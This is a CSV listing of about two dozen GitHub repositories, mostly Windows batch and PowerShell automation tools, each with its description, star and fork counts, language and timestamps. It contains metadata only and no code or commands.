name,url,description,stars,forks,language,created_at,updated_at
RedGreenBlue09/WFAv7_Installer,https://github.com/RedGreenBlue09/WFAv7_Installer,Batch script to install Windows 10 ARM desktop version to Lumia devices (dual boot & single boot).,136,15,Shell,2020-03-13T04:24:55Z,2026-08-02T01:02:46Z
slyfox1186/script-repo,https://github.com/slyfox1186/script-repo,My personal script repository with multiple languages supported. AHK v1+v2 | BASH | BATCH | JSON | PERL | POWERSHELL | PYTHON | WINDOWS REGISTRY | XML,135,16,Shell,2022-12-24T16:16:44Z,2026-07-29T15:01:56Z
iKineticate/AHK-ChangeIcon,https://github.com/iKineticate/AHK-ChangeIcon,"只需一步操作，用户即可随心批量更换/恢复快捷方式图标 ( With just one step, users can change or restore the icons of shortcuts in batches as they wish )",131,1,AutoHotkey,2023-09-22T06:43:29Z,2026-08-03T10:31:03Z
fpoussin/Qt5-MSVC-Static,https://github.com/fpoussin/Qt5-MSVC-Static,Batch scripts that download and build static Qt5 libs on Windows.,117,54,M4,2015-07-23T21:41:20Z,2026-05-13T12:59:08Z
daboynb/windows_scripts,https://github.com/daboynb/windows_scripts,Collection of useful automation scripts for Windows,117,20,PowerShell,2022-10-10T11:54:49Z,2026-07-27T14:12:16Z
canarddu38/DUCKSPLOIT,https://github.com/canarddu38/DUCKSPLOIT,Windows Hacking FrameWork using Reverse Shell,111,17,C#,2022-01-20T20:59:25Z,2026-06-29T23:41:59Z
ComPDFKit/compdfkit-conversion-sdk-windows,https://github.com/ComPDFKit/compdfkit-conversion-sdk-windows,"High-performance PDF conversion library for Windows desktop apps. Convert PDF to Word, Excel, PPT, HTML, CSV, images, text, RTF, searchable PDF, JSON, Markdown, and OFD while preserving original layout with pixel-perfect accuracy. Support OCR, AI table recognition, and batch processing.",109,10,HTML,2025-06-09T07:53:32Z,2026-07-01T03:20:31Z
jeremyben/thebatchman,https://github.com/jeremyben/thebatchman,Converts Windows batch scripts (or HTA) into executable files,97,20,JavaScript,2015-12-27T22:57:42Z,2026-07-10T13:47:22Z
hahndorf/Set-Privacy,https://github.com/hahndorf/Set-Privacy,PowerShell script to batch-change privacy settings in Windows 10,95,19,PowerShell,2015-08-04T03:02:20Z,2025-04-05T09:01:17Z
Scrut1ny/Windows-MAC-Address-Spoofer,https://github.com/Scrut1ny/Windows-MAC-Address-Spoofer,#1 Fully featured automated batchfile MAC address spoofer!,93,15,PowerShell,2021-12-22T01:10:02Z,2026-07-23T17:49:52Z
lingxiaoyiyu-hub/grok-register-win,https://github.com/lingxiaoyiyu-hub/grok-register-win,Windows 下双击即用的 Grok（xAI）账号自动注册面板 - 浏览器自动化注册、SSO→CPA 转换、多邮箱源支持、多格式导出,93,26,Python,2026-07-14T06:22:52Z,2026-08-04T09:21:09Z
Sidneys1/BatchImageProcessor,https://github.com/Sidneys1/BatchImageProcessor,A Mass Image Processing tool for Windows,89,16,C#,2015-03-30T20:20:37Z,2026-03-22T12:58:41Z
leongrdic/wsl-alias,https://github.com/leongrdic/wsl-alias,create aliases for Linux commands in Windows command line (for WSL),86,7,Shell,2017-09-28T09:21:42Z,2026-03-12T10:53:18Z
VVFGAA/BreventBat,https://github.com/VVFGAA/BreventBat,,81,8,Batchfile,2019-04-05T17:40:50Z,2026-07-23T21:08:03Z
hashhar/Windows-Hacks,https://github.com/hashhar/Windows-Hacks,"This repository contains registry scripts, batch files and some knowledge to help you make your Windows do awesome stuff (at least by my standards).",78,13,PowerShell,2015-10-09T09:27:52Z,2026-06-30T18:20:40Z
xanderfrangos/crushee,https://github.com/xanderfrangos/crushee,Desktop tool for batch image optimization and resizing. Available for Windows and Mac. Built with Electron and Node.js.,78,15,JavaScript,2019-03-18T13:57:48Z,2026-08-03T15:41:23Z
ritchielawrence/batchfunctionlibrary,https://github.com/ritchielawrence/batchfunctionlibrary,Library of Windows batch functions,77,18,HTML,2016-06-15T09:30:15Z,2026-05-11T16:08:41Z
Mario-Hero/toolUnRar,https://github.com/Mario-Hero/toolUnRar,用Python批量解压带密码的压缩包 A Python script for batch extraction with passwords,76,17,Python,2021-04-04T13:51:09Z,2026-04-05T00:50:27Z
StefanTraistaru/batch-export,https://github.com/StefanTraistaru/batch-export,Inkscape extension that allows you to export each layer into a single file.,71,9,Python,2020-08-16T16:10:38Z,2026-06-20T04:33:48Z
EbolaMan-YT/custom-cmd,https://github.com/EbolaMan-YT/custom-cmd,,55,11,Batchfile,2023-02-28T23:24:20Z,2026-08-02T15:15:59Z
SegoCode/DebloBat,https://github.com/SegoCode/DebloBat,"⚙️ Yet another (and ugly) debloat, optimizer and tweaker for Windows 11 based on group policies",50,4,Batchfile,2022-02-10T10:02:10Z,2026-07-08T02:35:48Z
dubbyOW/BCDEditTweaks,https://github.com/dubbyOW/BCDEditTweaks,.cmd script for enhancing Windows performance through optimized BCDEdit parameters.,50,5,Batchfile,2024-06-30T12:22:45Z,2026-07-14T04:48:43Z
LennoC/N_m3u8DL-RE_SimpleBatGUI,https://github.com/LennoC/N_m3u8DL-RE_SimpleBatGUI,简单的批处理调用N_m3u8DL-RE进行下载，预设单个下载、批量下载、录播下载。,50,11,Batchfile,2023-07-31T09:23:18Z,2026-07-28T13:55:27Z
edinsuta/yt-dlp-batch,https://github.com/edinsuta/yt-dlp-batch,Simple batch files for simplifying basic usage of https://github.com/yt-dlp/yt-dlp (a fork of https://github.com/rg3/youtube-dl) Windows .exe releases,50,3,Batchfile,2021-12-23T13:56:56Z,2026-07-19T03:58:44Z
